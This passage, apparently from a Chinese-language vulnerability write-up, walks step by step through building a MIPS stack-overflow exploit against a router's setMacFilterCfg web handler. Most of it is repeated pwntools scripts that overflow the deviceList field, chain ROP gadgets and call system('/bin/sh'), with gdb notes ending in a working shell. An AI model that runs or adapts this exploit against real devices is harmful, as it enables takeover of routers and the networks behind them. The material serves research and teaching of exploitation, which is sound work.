    context.log_level = "debug"
    libc = ELF("libc.so.0")
    def getshell():
        #getshell
        libc_base = 0x7f584320 - 0x60320#0x7f524000
        sys_off = 0x60320 
        rop1 = 0x13444
        rop2 = 0xaba4
        payload = "\r" +  "A" * 472 
        payload += p32(libc_base + rop1)
        payload += p32(0x7fffeef4)
        payload += "A" * 4 * 1                    
        url = "http://192.168.5.6/goform/setMacFilterCfg"
        cookie = {"Cookie":"password=12345"}
        data = {"macFilterType": "white", "deviceList": payload}   
        requests.post(url, cookies=cookie, data=data)
    try:
        getshell()
    except:
        print("Wrong.")
再次运行得到：
到这里之后，不要慌，这里应该是gdb的一个bug，一开始我以为也是出现了另一个问题，因为没有成功跳转到rop1，不过我在进行调试的时候发现，这时候只需要在rop1的地址加上2就可以在gdb中正常进行，修改exp为：
    import requests
    from pwn import *
    context.endian="little"
    context.arch="mips"
    context.log_level = "debug"
    libc = ELF("libc.so.0")
    def getshell():
        #getshell
        libc_base = 0x7f584320 - 0x60320#0x7f524000
        sys_off = 0x60320 
        rop1 = 0x13446
        rop2 = 0xaba4
        payload = "\r" +  "A" * 472 
        payload += p32(libc_base + rop1)
        payload += p32(0x7fffeef4)
        payload += "A" * 4 * 7                   
        url = "http://192.168.5.6/goform/setMacFilterCfg"
        cookie = {"Cookie":"password=12345"}
        data = {"macFilterType": "white", "deviceList": payload}   
        requests.post(url, cookies=cookie, data=data)
    try:
        getshell()
    except:
        print("Wrong.")
动态调试：
发现在gdb中可以正常运行至rop1处，那看到这里，可能会很疑惑，到底是看哪个地址呢？在gdb中运用disassemble命令查看该块的汇编指令，发现此时在汇编指令中，并没有箭头指向：
所以我们应该以第一次的地址为准也就是rop1=0x13444。第一次出错可能是gdb的小bug，但是这里既然可以跳转至rop1了，说明栈帧都是平衡了，可以进行rop操作了，修改exp为：
    import requests
    from pwn import *
    context.endian="little"
    context.arch="mips"
    context.log_level = "debug"
    libc = ELF("libc.so.0")
    def getshell():
        #getshell
        libc_base = 0x7f584320 - 0x60320#0x7f524000
        sys_off = 0x60320 
        rop1 = 0x13444
        rop2 = 0xaba4
        payload = "\r" +  "A" * 472 
        payload += p32(libc_base + rop1)
        payload += p32(0x7fffeef4)
        payload += "A" * 28
        payload += "B" * 4                                          #$s0
        payload += p32(libc_base + next(libc.search("/bin/sh")))    #$s1
        payload += p32(libc_base + sys_off)                         #$s2
        payload += 'B' * 4                                          #$s3
        payload += 'B' * 4                                          #$s4
        payload += 'B' * 4                                          #$s5
        payload += 'B' * 4                                          #$s6
        payload += 'B' * 4                                          #$s7
        payload += "B" * 4                                          #$fp
        payload += p32(libc_base + rop2)                            #$ra   
        url = "http://192.168.5.4/goform/setMacFilterCfg"
        cookie = {"Cookie":"password=12345"}
        data = {"macFilterType": "white", "deviceList": payload}
        requests.post(url, cookies=cookie, data=data)
    try:
        getshell()
    except:
        print("Wrong.")
最终执行，断点依旧下载rop1处：
rop1处寄存器都成功被覆盖，继续步入rop2中：
发现rop2处的地址也覆盖得非常成功，继续si步入system函数：
但是si一进去，就意识到了事情不对劲，$a0也变了，这样就不能执行system(“/bin/sh”)，具体为什么$a0会发生改变，这个我也不是很清楚，随后我更换了gadget2的跳转指令为jr的，即：
    .text:00046860                 move    $a0, $s1
    .text:00046864                 addiu   $a1, $s0, 0x10
    .text:00046868                 move    $t9, $s2
    .text:0004686C                 lw      $ra, 0x18+var_sC($sp)
    .text:00046870                 lw      $s2, 0x18+var_s8($sp)
    .text:00046874                 lw      $s1, 0x18+var_s4($sp)
    .text:00046878                 lw      $s0, 0x18+var_s0($sp)
    .text:0004687C                 jr      $t9 ; xdr_u_long
万幸的是这个gadget2不需要对gadget1进行修改，直接跳转就行，修改exp为：
    import requests
    from pwn import *
    context.endian="little"
    context.arch="mips"
    context.log_level = "debug"
    libc = ELF("libc.so.0")
    def getshell():
        #getshell
        libc_base = 0x7f584320 - 0x60320#0x7f524000
        sys_off = 0x60320 
        rop1 = 0x13444
        rop2 = 0x46860
        payload = "\r" +  "A" * 472 
        payload += p32(libc_base + rop1)
        payload += p32(0x7fffeef4)
        payload += "A" * 28
        payload += "B" * 4                                          #$s0
        payload += p32(libc_base + next(libc.search("/bin/sh")))    #$s1
        payload += p32(libc_base + sys_off)                         #$s2
        payload += 'B' * 4                                          #$s3
        payload += 'B' * 4                                          #$s4
        payload += 'B' * 4                                          #$s5
        payload += 'B' * 4                                          #$s6
        payload += 'B' * 4                                          #$s7
        payload += "B" * 4                                          #$fp
        payload += p32(libc_base + rop2)                            #$ra   
        url = "http://192.168.5.6/goform/setMacFilterCfg"
        cookie = {"Cookie":"password=12345"}
        data = {"macFilterType": "white", "deviceList": payload}
        requests.post(url, cookies=cookie, data=data)
    try:
        getshell()
    except:
        print("Wrong.")
修改完之后，继续进行动态调试，断点下载rop2处：
单步si调试至跳转处，发现程序一切正常：
进入跳转：
看到这里，长吁一口气，大功告成，自信地按下c：
getshell成功！